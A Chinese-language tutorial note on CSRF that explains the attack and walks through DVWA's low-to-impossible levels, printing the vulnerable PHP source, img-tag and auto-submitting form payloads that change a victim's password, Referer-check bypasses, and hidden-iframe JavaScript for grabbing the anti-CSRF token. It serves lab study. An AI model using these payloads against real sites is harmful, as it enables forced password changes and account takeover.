---
typora-copy-images-to: ../images
typora-root-url: ..
---



## CSRF漏洞

### CSRF原理

CSRF( Cross Site Request Forgery)也就是跨站请求伪造。对于 CSRF来说，其两个关键点是跨站与请求伪造，跨站的意思很好理解，也就是跨域名访问，具体指的是运行在浏览器中的某个URL下的脚本读取另一个域名在当前浏览器的存储数据，例如cookie。请求伪造就伪造成受害用户向服务器发送操作请求，执行用户非预期的操作。一般流程是攻击者诱导受害者访问第三方网站，然后第三方网站向被攻击的网站发送跨站请求。利用受害者在被攻击网站获取的登录凭证，绕过后台的校验，从而达到冒充受害用户对被攻击网站执行某项操作的目的。



一个典型的CSRF攻击流程如下：

1. 受害者登录a.com，并保留了登录凭证（Cookie）。
2. 攻击者引诱受害者访问了b.com。
3. b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带a.com的Cookie。
4. a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。
5. a.com以受害者的名义执行了act=xx。
6. 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作。



### CSRF类型

CSRF基本可以分为GET型、POST型和链接型

* GET型的CSRF

  GET类型的CSRF很简单，就是一个HTTP请求，一般形式如下：（这是dvwa靶场的csrf例子）

  ```
  <img src="http://192.168.134.136:8080/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change"
  ```

  只要受害者访问含有这个img标签的网页，浏览器就会自动向dvwa服务器发送修改密码的请求。

* POST型的CSRF

  POST型的CSRF一般是利用隐藏起来的可以自动提交的表单，如：

  ```html
  <form action="http://192.168.134.136:8080/Change" method=POST>
      <input type="hidden" name="password_new" value="xiaoming" />
      <input type="hidden" name="password_conf" value="10000" />
      <input type="hidden" name="submit" value="submit" />
  </form>
  <script> document.forms[0].submit(); </script> 
  ```

* 链接型的CSRF

  链接型的CSRF需要受害者点击恶意链接才能触发，一般是在图片中嵌入恶意链接



### DVWA上的CSRF

#### low

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 
```

low这一关很简单，它参数都通过GET请求获取，它修改密码的功能仅检查用户两次输入的密码是否一致，如果相同就直接修改用户密码，没有进行额外的检查，所以存在CSRF漏洞。一般payload如下：

```
http://192.168.134.136:8080/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change#
```

任何用户访问这条链接都会将密码设置为test，但是一般用户都不会那么傻，访问这个明显看起来不对劲的链接

所以可以通过短链接进行隐藏，短链接会将用户连接转换为http://t.hk.uy/zMt的形式，不过要有自己的域名，我没有就不试了。

也可以通过下面的形式进行利用

```html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>test</title>
</head>
<body>
    <img src="http://192.168.134.136:8080/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change#">
</body>
</html>
```

受害用户访问这个网页会自动向服务请发送请求，修改密码



#### medium

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Checks to see where the request came from
    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ])!=-1 ) {
        // Get input
        $pass_new  = $_GET[ 'password_new' ];
        $pass_conf = $_GET[ 'password_conf' ];

        // Do the passwords match?
        if( $pass_new == $pass_conf ) {
            // They do!
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );

            // Update the database
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Feedback for the user
            echo "<pre>Password Changed.</pre>";
        }
        else {
            // Issue with passwords matching
            echo "<pre>Passwords did not match.</pre>";
        }
    }
    else {
        // Didn't come from a trusted source
        echo "<pre>That request didn't look correct.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 
```

medium等级添加了对请求来源的检查`stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ])!=-1`， 其中 $_SERVER[ 'HTTP_REFERER' ]是链接到当前页面的前一页面的地址，$_SERVER[ 'SERVER_NAME' ]是服务器的主机名，一般是域名。stripos函数用于判断子串是否在字符串中出现，并没有判断它出现的位置，所以绕过方法有很多，如下：

* 构造的网页文件名称包含它的域名
* 构造的网页文件所在目录名包含域名
* 申请一个带着它服务器域名的子域名
* 在恶意请求后添加一个带服务器域名的参数，例如：http://demo.com/csrf.html?targetservername



#### high

```php
 <?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

high级别的csrf它增加了token的检查机制。用户访问密码修改页面时，服务器会返回一个随机的token，当用户向服务器提交请求时需要将token的值附上。服务器在接收到请求后会先检查token，如果用户token和存放在服务器的值不一样，就会拒绝执行。

要绕过high级别的token检查机制，就要获得受害用户页面的token

一般获取受害用户token的方法是通过javascript，代码如下：

```js
<script>
  function attack(){
    var token = document.getElementById("get_token").contentWindow.document.getElementsByName('user_token')[0].value
    document.getElementsByName('user_token')[0].value=token;
    alert(token);
    document.getElementById("csrf").submit();
  }
</script>
<iframe src="http://192.168.31.157:8080/vulnerabilities/csrf/" id="get_token" style="display:none;">
</iframe>
```

这里通过一个看不见的iframe来访问密码修改的页面，并获取页面的token

但是这就会产生一个跨域的问题，在浏览器中不同域下的页面不能访问另一个域的内容。所以一般是通过xss漏洞来获取用户的token，然后再发送修改密码的请求，这里懒，就不演示了。



#### impossible

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $pass_curr = $_GET[ 'password_current' ];
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Sanitise current password input
    $pass_curr = stripslashes( $pass_curr );
    $pass_curr = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass_curr = md5( $pass_curr );

    // Check that the current password is correct
    $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
    $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
    $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );
    $data->execute();

    // Do both new passwords match and does the current password match the user?
    if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) {
        // It does!
        $pass_new = stripslashes( $pass_new );
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update database with new password
        $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
        $data->bindParam( ':password', $pass_new, PDO::PARAM_STR );
        $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
        $data->execute();

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match or current password incorrect.</pre>";
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```

impossible级别的防护机制就更加严了，没什么操作空间。它添加了对用户旧密码的检查，除非是制作钓鱼网页，诱导用户输入密码，不然没啥搞头



最后贴一个介绍绕过csrf的trick的pdf:[neat-tricks-to-bypass-csrfprotection](https://www.slideshare.net/0ang3el/neat-tricks-to-bypass-csrfprotection)



### REFERENCE

* https://tech.meituan.com/2018/10/11/fe-security-csrf.html
* http://deepnote.me/2020/04/26/csrf/
* https://www.cnblogs.com/zhengna/p/12736823.html

